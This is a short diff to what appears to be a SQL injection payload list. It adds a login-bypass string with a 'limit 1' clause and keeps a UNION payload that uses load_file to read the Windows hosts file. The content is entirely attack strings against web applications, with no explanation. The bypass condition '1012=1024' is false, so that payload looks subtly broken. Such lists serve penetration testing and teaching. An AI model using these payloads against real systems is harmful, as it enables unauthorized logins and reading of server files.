@@ -1,5 +1,6 @@
 # Basic SQLi
 login' or 1012=1024;#
+login' or 1012=1024 limit 1;#
 
 #Load file:
 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
